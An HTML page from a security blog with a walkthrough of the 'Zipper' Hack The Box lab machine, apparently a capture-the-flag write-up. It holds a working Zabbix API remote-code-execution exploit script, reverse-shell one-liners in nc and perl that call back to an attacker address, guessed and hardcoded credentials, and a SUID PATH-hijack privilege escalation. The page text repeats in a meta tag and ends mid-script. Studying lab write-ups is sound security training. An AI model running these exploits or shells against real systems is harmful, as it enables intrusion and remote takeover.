<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Zipper - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Zipper from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Zipper">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/zipper/">


  <meta property="og:description" content="My write-up / walkthrough for Zipper from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Zipper">
  <meta name="twitter:description" content="My write-up / walkthrough for Zipper from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/zipper/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-02-23T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/zipper/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Zipper">
    <meta itemprop="description" content="Hack The Box - ZipperQuick SummaryHey guys today Zipper retired and here’s my write-up. Owning user on this box was challenging because we have to exploit an RCE vulnerability which is not really easy and then we have to get a stable shell to be able to enumerate, for the privilege escalation it was easy but I also liked it because it was a binary exploitation. It was a very fun box and I liked it. It’s a linux box and its ip is 10.10.10.108 , I added it to /etc/hosts as zipper.htb. Let’s jump right in.NmapAs always we will start with nmap to scan for open ports and services :nmap -sV -sT -sC zipper.htbWe only get 2 ports , http on port 80 and ssh on port 22. so we are going to check httpHTTP enumerationBy visiting zipper.htb we get the default apache2 page :So I’m going to run gobuster with directory-list-2.3-medium.txt to see if there are any sub directories : gobuster -u http://zipper.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txtOutput :=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://zipper.htb/[+] Threads      : 100[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 4m10s=====================================================2019/02/22 08:50:38 Starting gobuster=====================================================/zabbix (Status: 301)We got /zabbix , let’s look at that in the browser : We get this login page , we don’t have credentials but down there there’s an option to sign in as a guest , but before we do that let’s get an idea about zabbix  Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption. -WikipediaSo basically it’s a server monitoring tool , let’s login as a guest and see what we can get We get this dashboard , but we are not privileged to do anything because we are guestAfter some enumeration we will notice in : Monitoring –&gt; Latest data , Zapper's Backup ScriptNow we have a potential username :  zapper , we can try to brute force or fuzz the password , but a quick guess worked for me , the username is the password zapper : zapper GUI access disabled , on exploit-db there’s an authenticated remote code execution exploit for an old version of zabbix , check it here , Unfortunately valid credentials are not enough to exploit it , if we take a look here :We also need hostid , and to get that we need to get GUI accessGUI access through zabbix-cliThere’s a cli tool for zabbix on github , we can use it to gain GUI access. Installation and configuration is simple you will get the source from github then install it with install.py install then you will create a conf file for it by executing zabbix-cli --config, it will be saved in  $HOME/.zabbix-cli/zabbix-cli.conf , open the conf file and in Zabbix API section add this line :zabbix_api_url=http://10.10.10.108/zabbixFor details read the documentation hereThen we will run zabbix-cli it will ask for a username and a password , we already have them zapper : zapperif we executed show_usergroups we will see that zapper is in a group called No access to the fronted and GUI access to that group is disabledWe will create a new group and call it guiaccess and leave GUI access as system defaultcreate_usergroupThen we will add zapper to that group and delete him from No access to the fronted add_user_to_usergroupremove_user_from_usergroupNow if we try to login again as zapper we will get the dashboard :RCE and getting userFrom Configuration –&gt; Hosts we have 2 hosts and the second one is the availabe one :If we click on it we will get an edit page , but we will notice that the host id is included in the url as a GET parameter :Now we can edit the python exploit and add the host id : 10106 , this is how the basic login info in the script will look like :And we get a decent shell , but this shell executes commands through API requests which is not efficient , so we will get a reverse shell like this :rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f I got this shell from payload all the thingsProblem is , we will find that we are in a docker container , and that’s actually a bad rabbit hole and when I was doing this box for the first time i spent a lot of time trying to escape this docker container , And eventually i found out that this is the wrong server.If we take a look at this page from zabbix documentation , this part :there’s an option called execute_on , which has 2 possible values : 0 to execute on zabbix agent , and 1 to execute on zabbix server. We don’t have that option included in the exploit so we are using the default option 1 which means we are executing commands on zabbix server. So we will edit the exploit json data and add &quot;execute_on&quot; : &quot;0&quot; in those 2 parts :After that we will run the exploit again and now it will run on the right server , however the shell that we used before didn’t work and died immediately because the exploit crashed for some reason , I had to comment out the last line which prints the result : print cmd_exe[&quot;result&quot;][&quot;value&quot;] , but it didn’t fix it , so I tried some other shells and the perl one worked :perl -e 'use Socket;$i=&quot;10.10.xx.xx&quot;;$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'Then I used used python3 pty to get a proper shell , python2 didn’t exist on the serverFinal exploit after edits :#!/usr/bin/python# -*- coding: utf-8 -*-# Exploit Title: Zabbix RCE with API JSON-RPC# Date: 06-06-2016# Exploit Author: Alexander Gurin# Vendor Homepage: http://www.zabbix.com# Software Link: http://www.zabbix.com/download.php# Version: 2.2 - 3.0.3# Tested on: Linux (Debian, CentOS)# CVE : N/Aimport requestsimport jsonimport readlineZABIX_ROOT = 'http://10.10.10.108/zabbix'	## Zabbix IP-addressurl = ZABIX_ROOT + '/api_jsonrpc.php'	## Don't editlogin = 'zapper'		## Zabbix loginpassword = 'zapper'	## Zabbix passwordhostid = '10106'	## Zabbix hostid## authpayload = {    &quot;jsonrpc&quot; : &quot;2.0&quot;,    &quot;method&quot; : &quot;user.login&quot;,    &quot;params&quot;: {    	'user': &quot;&quot;+login+&quot;&quot;,    	'password': &quot;&quot;+password+&quot;&quot;,    },    &quot;auth&quot; : None,    &quot;id&quot; : 0,}headers = {    'content-type': 'application/json',}auth  = requests.post(url, data=json.dumps(payload), headers=(headers))auth = auth.json()while True:	cmd = raw_input('\033[41m[zabbix_cmd]&gt;&gt;: \033[0m ')	if cmd == &quot;&quot; : print &quot;Result of last command:&quot;	if cmd == &quot;quit&quot; : break## update	payload = {		&quot;jsonrpc&quot;: &quot;2.0&quot;,		&quot;method&quot;: &quot;script.update&quot;,		&quot;params&quot;: {		    &quot;scriptid&quot;: &quot;1&quot;,		    &quot;command&quot;: &quot;&quot;+cmd+&quot;&quot;,		    &quot;execute_on&quot; : &quot;0&quot;		},		&quot;auth&quot; : auth['result'],		&quot;id&quot; : 0,	}	cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))## execute	payload = {		&quot;jsonrpc&quot;: &quot;2.0&quot;,		&quot;method&quot;: &quot;script.execute&quot;,		&quot;params&quot;: {		    &quot;scriptid&quot;: &quot;1&quot;,		    &quot;hostid&quot;: &quot;&quot;+hostid+&quot;&quot;		},		&quot;auth&quot; : auth['result'],		&quot;id&quot; : 0,		&quot;execute_on&quot; : &quot;1&quot;	}	cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))	cmd_exe = cmd_exe.json()#	print cmd_exe[&quot;result&quot;][&quot;value&quot;]First thing we will notice that we are zabbix and in /home there’s a directory for the user zapper We can’t read user.txt and we can’t go into .sshThere’s another directory called utils which contains 2 files , backup.sh and zabbix-servicecat backup.shWe see that it has a hardcoded password in it : ZippityDoDah , we can try to su to zapper with that passwordAnd it worked , now we can get the ssh key from .ssh and have ssh connectionAnd we owned user !Privilege Escalation and getting rootIf we take a look at the utils directory again and execute zabbix-service :It asks us start or stop? then it executes something and exits , we will check if that binary is a suid binary : find /home/zapper/utils -perm -4000It’s a suid binary , we need to know what is it doing. Without reverse engineering , strings was enough :strings zabbix-serviceThis command is being executed when we type start : systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent , so what are we going to do is the same as we did in Dab , the only difference is in dab we hijacked a shared library that the binary used , but here we will hijack a binary. By default systemctl points to /bin/systemctlWe will create a c program to execute /bin/bash :Then we will compile it with gcc : gcc exploit.c -o systemctlNow we have our fake binary ready : We will add /home/zapper/utils as the first entry in PATH env variable , so the system will look there first : export PATH=/home/zapper/utils:$PATHThis is changing the PATH variable to /home/zapper/utils: + the old path Now systemctl points to our fake binary , let’s run zabbix-service :And we owned root !That’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Hack The Box write-up : Hack The Box - GiddyNext Hack The Box write-up : Hack The Box - Access">
    <meta itemprop="datePublished" content="2019-02-23T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/zipper/" class="u-url" itemprop="url">Hack The Box - Zipper
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-02-23T07:00:00+02:00">February 23, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          7 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---zipper">Hack The Box - Zipper</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http-enumeration">HTTP enumeration</a></li>
<li><a href="#gui-access-through-zabbix-cli">GUI access through zabbix-cli</a></li>
<li><a href="#rce-and-getting-user">RCE and getting user</a></li>
<li><a href="#final-exploit-after-edits-">Final exploit after edits :</a></li>
<li><a href="#privilege-escalation-and-getting-root">Privilege Escalation and getting root</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---zipper">Hack The Box - Zipper</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Zipper retired and here’s my write-up. Owning user on this box was challenging because we have to exploit an RCE vulnerability which is not really easy and then we have to get a stable shell to be able to enumerate, for the privilege escalation it was easy but I also liked it because it was a binary exploitation. It was a very fun box and I liked it. It’s a linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.108</code> , I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">zipper.htb</code>. Let’s jump right in.<br>
<br><img src="/images/hackthebox/zipper/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with nmap to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC zipper.htb</code>
<br><img src="/images/hackthebox/zipper/1.png" alt="" class="align-center"><br><br>
We only get 2 ports , http on port 80 and ssh on port 22. so we are going to check http</p>

<h2 id="http-enumeration">HTTP enumeration</h2>
<p>By visiting <code class="language-plaintext highlighter-rouge">zipper.htb</code> we get the default apache2 page :
<br><img src="/images/hackthebox/zipper/2.png" alt="" class="align-center"><br><br>
So I’m going to run <code class="language-plaintext highlighter-rouge">gobuster</code> with <code class="language-plaintext highlighter-rouge">directory-list-2.3-medium.txt</code> to see if there are any sub directories : 
<code class="language-plaintext highlighter-rouge">gobuster -u http://zipper.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>
<br>Output :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://zipper.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 4m10s
=====================================================
2019/02/22 08:50:38 Starting gobuster
=====================================================
/zabbix (Status: 301)
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">/zabbix</code> , let’s look at that in the browser : 
<br><img src="/images/hackthebox/zipper/3.png" alt="" class="align-center"><br><br>
We get this login page , we don’t have credentials but down there there’s an option to sign in as a guest , but before we do that let’s get an idea about <code class="language-plaintext highlighter-rouge">zabbix</code></p>

<blockquote>
  <p>Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption. -<a href="https://en.wikipedia.org/wiki/Zabbix" target="_blank" rel="noopener noreferrer">Wikipedia</a></p>
</blockquote>

<p>So basically it’s a server monitoring tool , let’s login as a guest and see what we can get 
<br><img src="/images/hackthebox/zipper/4.png" alt="" class="align-center"><br><br>
We get this dashboard , but we are not privileged to do anything because we are <code class="language-plaintext highlighter-rouge">guest</code>
After some enumeration we will notice in : Monitoring –&gt; Latest data , <code class="language-plaintext highlighter-rouge">Zapper's Backup Script</code>
<br><img src="/images/hackthebox/zipper/5.png" alt="" class="align-center"><br><br>
Now we have a potential username :  <code class="language-plaintext highlighter-rouge">zapper</code> , we can try to brute force or fuzz the password , but a quick guess worked for me , the username is the password <code class="language-plaintext highlighter-rouge">zapper : zapper</code> 
<br><img src="/images/hackthebox/zipper/6.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/zipper/7.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">GUI access disabled</code> , on exploit-db there’s an authenticated remote code execution exploit for an old version of zabbix , check it <a href="https://www.exploit-db.com/exploits/39937" target="_blank" rel="noopener noreferrer">here</a> , Unfortunately valid credentials are not enough to exploit it , if we take a look here :
<br><img src="/images/hackthebox/zipper/8.png" alt="" class="align-center"><br><br>
We also need <code class="language-plaintext highlighter-rouge">hostid</code> , and to get that we need to get GUI access</p>

<h2 id="gui-access-through-zabbix-cli">GUI access through zabbix-cli</h2>
<p>There’s a cli tool for zabbix on <a href="https://github.com/usit-gd/zabbix-cli" target="_blank" rel="noopener noreferrer">github</a> , we can use it to gain GUI access. Installation and configuration is simple you will get the source from github then install it with <code class="language-plaintext highlighter-rouge">install.py install</code> then you will create a <code class="language-plaintext highlighter-rouge">conf</code> file for it by executing <code class="language-plaintext highlighter-rouge">zabbix-cli --config</code>, it will be saved in  <code class="language-plaintext highlighter-rouge">$HOME/.zabbix-cli/zabbix-cli.conf</code> , open the <code class="language-plaintext highlighter-rouge">conf</code> file and in Zabbix API section add this line :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zabbix_api_url=http://10.10.10.108/zabbix
</code></pre></div></div>
<p>For details read the documentation <a href="https://github.com/usit-gd/zabbix-cli/blob/master/docs/manual.rst#installing-from-source" target="_blank" rel="noopener noreferrer">here</a>
Then we will run <code class="language-plaintext highlighter-rouge">zabbix-cli</code> it will ask for a username and a password , we already have them <code class="language-plaintext highlighter-rouge">zapper : zapper</code>
if we executed <code class="language-plaintext highlighter-rouge">show_usergroups</code> we will see that <code class="language-plaintext highlighter-rouge">zapper</code> is in a group called <code class="language-plaintext highlighter-rouge">No access to the fronted</code> and GUI access to that group is disabled
<br><img src="/images/hackthebox/zipper/9.png" alt="" class="align-center"><br><br>
We will create a new group and call it <code class="language-plaintext highlighter-rouge">guiaccess</code> and leave GUI access as system default
<code class="language-plaintext highlighter-rouge">create_usergroup</code>
<br><img src="/images/hackthebox/zipper/10.png" alt="" class="align-center"><br><br>
Then we will add <code class="language-plaintext highlighter-rouge">zapper</code> to that group and delete him from <code class="language-plaintext highlighter-rouge">No access to the fronted</code> 
<code class="language-plaintext highlighter-rouge">add_user_to_usergroup</code>
<br><img src="/images/hackthebox/zipper/11.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">remove_user_from_usergroup</code>
<br><img src="/images/hackthebox/zipper/12.png" alt="" class="align-center"><br><br>
Now if we try to login again as <code class="language-plaintext highlighter-rouge">zapper</code> we will get the dashboard :
<br><img src="/images/hackthebox/zipper/13.png" alt="" class="align-center"><br><br></p>

<h2 id="rce-and-getting-user">RCE and getting user</h2>
<p>From Configuration –&gt; Hosts we have 2 hosts and the second one is the availabe one :
<br><img src="/images/hackthebox/zipper/14.png" alt="" class="align-center"><br><br>
If we click on it we will get an edit page , but we will notice that the <code class="language-plaintext highlighter-rouge">host id</code> is included in the url as a GET parameter :
<br><img src="/images/hackthebox/zipper/15.png" alt="" class="align-center"><br><br>
Now we can edit the python exploit and add the host id : <code class="language-plaintext highlighter-rouge">10106</code> , this is how the basic login info in the script will look like :
<br><img src="/images/hackthebox/zipper/16.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/zipper/17.png" alt="" class="align-center"><br><br>
And we get a decent shell , but this shell executes commands through API requests which is not efficient , so we will get a reverse shell like this :
<code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f</code> 
I got this shell from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener noreferrer">payload all the things</a>
<br><img src="/images/hackthebox/zipper/18.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/zipper/19.png" alt="" class="align-center"><br><br>
Problem is , we will find that we are in a docker container , and that’s actually a bad rabbit hole and when I was doing this box for the first time i spent a lot of time trying to escape this docker container , And eventually i found out that this is the wrong server.<br>
<br><img src="/images/hackthebox/zipper/20.png" alt="" class="align-center"><br><br>
If we take a look at <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/script/object" target="_blank" rel="noopener noreferrer">this page</a> from zabbix documentation , this part :
<br><img src="/images/hackthebox/zipper/21.png" alt="" class="align-center"><br><br>
there’s an option called <code class="language-plaintext highlighter-rouge">execute_on</code> , which has 2 possible values : <code class="language-plaintext highlighter-rouge">0</code> to execute on zabbix agent , and <code class="language-plaintext highlighter-rouge">1</code> to execute on zabbix server. We don’t have that option included in the exploit so we are using the default option <code class="language-plaintext highlighter-rouge">1</code> which means we are executing commands on zabbix server. So we will edit the exploit json data and add <code class="language-plaintext highlighter-rouge">"execute_on" : "0"</code> in those 2 parts :
<br><img src="/images/hackthebox/zipper/22.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/zipper/23.png" alt="" class="align-center"><br><br>
After that we will run the exploit again and now it will run on the right server , however the shell that we used before didn’t work and died immediately because the exploit crashed for some reason , I had to comment out the last line which prints the result : <code class="language-plaintext highlighter-rouge">print cmd_exe["result"]["value"]</code> , but it didn’t fix it , so I tried some other shells and the <code class="language-plaintext highlighter-rouge">perl</code> one worked :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.10.xx.xx";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre></div></div>
<p>Then I used used <code class="language-plaintext highlighter-rouge">python3</code> pty to get a proper shell , python2 didn’t exist on the server
<br><img src="/images/hackthebox/zipper/24.png" alt="" class="align-center"><br><br></p>

<h2 id="final-exploit-after-edits-">Final exploit after edits :</h2>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
# -*- coding: utf-8 -*-
</span>
<span class="c1"># Exploit Title: Zabbix RCE with API JSON-RPC
# Date: 06-06-2016
# Exploit Author: Alexander Gurin
# Vendor Homepage: http://www.zabbix.com
# Software Link: http://www.zabbix.com/download.php
# Version: 2.2 - 3.0.3
# Tested on: Linux (Debian, CentOS)
# CVE : N/A
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">readline</span>

<span class="n">ZABIX_ROOT</span> <span class="o">=</span> <span class="s">'http://10.10.10.108/zabbix'</span>	<span class="c1">## Zabbix IP-address
</span><span class="n">url</span> <span class="o">=</span> <span class="n">ZABIX_ROOT</span> <span class="o">+</span> <span class="s">'/api_jsonrpc.php'</span>	<span class="c1">## Don't edit
</span>
<span class="n">login</span> <span class="o">=</span> <span class="s">'zapper'</span>		<span class="c1">## Zabbix login
</span><span class="n">password</span> <span class="o">=</span> <span class="s">'zapper'</span>	<span class="c1">## Zabbix password
</span><span class="n">hostid</span> <span class="o">=</span> <span class="s">'10106'</span>	<span class="c1">## Zabbix hostid
</span>
<span class="c1">## auth
</span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"jsonrpc"</span> <span class="p">:</span> <span class="s">"2.0"</span><span class="p">,</span>
    <span class="s">"method"</span> <span class="p">:</span> <span class="s">"user.login"</span><span class="p">,</span>
    <span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
    	<span class="s">'user'</span><span class="p">:</span> <span class="s">""</span><span class="o">+</span><span class="n">login</span><span class="o">+</span><span class="s">""</span><span class="p">,</span>
    	<span class="s">'password'</span><span class="p">:</span> <span class="s">""</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="s">""</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="s">"auth"</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
    <span class="s">"id"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
<span class="p">}</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'content-type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">auth</span>  <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="p">(</span><span class="n">headers</span><span class="p">))</span>
<span class="n">auth</span> <span class="o">=</span> <span class="n">auth</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'</span><span class="se">\033</span><span class="s">[41m[zabbix_cmd]&gt;&gt;: </span><span class="se">\033</span><span class="s">[0m '</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">""</span> <span class="p">:</span> <span class="k">print</span> <span class="s">"Result of last command:"</span>
	<span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"quit"</span> <span class="p">:</span> <span class="k">break</span>

<span class="c1">## update
</span>	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">"jsonrpc"</span><span class="p">:</span> <span class="s">"2.0"</span><span class="p">,</span>
		<span class="s">"method"</span><span class="p">:</span> <span class="s">"script.update"</span><span class="p">,</span>
		<span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
		    <span class="s">"scriptid"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
		    <span class="s">"command"</span><span class="p">:</span> <span class="s">""</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s">""</span><span class="p">,</span>
		    <span class="s">"execute_on"</span> <span class="p">:</span> <span class="s">"0"</span>
		<span class="p">},</span>
		<span class="s">"auth"</span> <span class="p">:</span> <span class="n">auth</span><span class="p">[</span><span class="s">'result'</span><span class="p">],</span>
		<span class="s">"id"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
	<span class="p">}</span>

	<span class="n">cmd_upd</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="p">(</span><span class="n">headers</span><span class="p">))</span>

<span class="c1">## execute
</span>	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">"jsonrpc"</span><span class="p">:</span> <span class="s">"2.0"</span><span class="p">,</span>
		<span class="s">"method"</span><span class="p">:</span> <span class="s">"script.execute"</span><span class="p">,</span>
		<span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
